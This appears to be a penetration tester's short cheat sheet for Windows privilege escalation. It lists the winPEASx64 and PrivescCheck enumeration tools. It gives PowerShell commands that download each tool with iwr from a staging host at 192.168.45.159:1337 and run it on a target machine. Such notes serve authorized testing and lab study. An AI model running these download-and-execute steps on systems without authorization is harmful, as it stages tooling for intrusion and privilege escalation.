# winPEASx64
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

Issue with the latest build of missing DLL. To fix, use this release
https://github.com/carlospolop/PEASS-ng/releases/tag/20230423-4d9bddc5

```bash
iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
./winPEASx64.exe
```

-----------------------
# PrivescCheck
https://github.com/itm4n/PrivescCheck

```bash
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
. .\privesccheck.ps1
Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
```
